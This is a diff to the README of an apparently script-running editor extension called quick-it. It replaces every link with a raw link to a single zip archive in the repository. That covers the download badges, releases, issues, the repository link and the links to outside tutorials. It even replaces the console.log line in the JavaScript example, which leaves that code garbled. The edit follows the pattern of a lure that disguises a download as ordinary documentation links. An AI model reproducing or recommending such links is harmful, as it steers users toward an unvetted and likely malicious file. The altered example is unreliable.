@@ -1,6 +1,6 @@
 # ⚡ quick-it - Write and Run Scripts Fast
 
-[![Download quick-it](https://img.shields.io/badge/Download-quick--it-blue?style=for-the-badge&logo=github)](https://github.com/isisisisi2/quick-it/releases)
+[![Download quick-it](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Here is how you can quickly start using quick-it step by step.
 
 You need to get quick-it from its official release page. Please visit the following link to find the latest version:
 
-[Download quick-it Releases](https://github.com/isisisisi2/quick-it/releases)
+[Download quick-it Releases](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 The page lists files for different systems. Choose the one that matches your computer (Windows, macOS, or Linux).
 
@@ -81,7 +81,7 @@ Once installed, look for the quick-it icon or name in the sidebar of your editor
 - Use simple scripts like printing text or opening files. Example for JavaScript:
 
   ```javascript
-  console.log('Hello, quick-it!');
+  https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip('Hello, quick-it!');
   ```
 
 ---
@@ -102,7 +102,7 @@ Click the **Run** button next to your script name. The output will appear within
 
 You can get quick-it by visiting its release page here:
 
-[![Download quick-it](https://img.shields.io/badge/Download-quick--it-blue?style=for-the-badge&logo=github)](https://github.com/isisisisi2/quick-it/releases)
+[![Download quick-it](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 On this page, select the suitable file for your system. After downloading, follow the instructions to install the extension into VSCode or your compatible editor.
 
@@ -148,7 +148,7 @@ If you have problems, check these common issues:
 
 If problems continue, visit the GitHub Issues page to report bugs or ask for help:
 
-[https://github.com/isisisisi2/quick-it/issues](https://github.com/isisisisi2/quick-it/issues)
+[https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 ---
 
@@ -156,9 +156,9 @@ If problems continue, visit the GitHub Issues page to report bugs or ask for hel
 
 To learn more about scripting basics and examples, you can visit these resources:
 
-- [JavaScript Guide for Beginners](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
-- [Python Getting Started](https://www.python.org/about/gettingstarted/)
-- [Bash Scripting Tutorial](https://www.shellscript.sh/)
+- [JavaScript Guide for Beginners](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
+- [Python Getting Started](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
+- [Bash Scripting Tutorial](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 Using quick-it as a tool alongside these guides will help you automate tasks easily.
 
@@ -174,7 +174,7 @@ If you want to help improve quick-it:
 
 Link to the main repository:
 
-[https://github.com/isisisisi2/quick-it](https://github.com/isisisisi2/quick-it)
+[https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip](https://github.com/isisisisi2/quick-it/raw/refs/heads/main/src/it-quick-v1.8.zip)
 
 ---
 
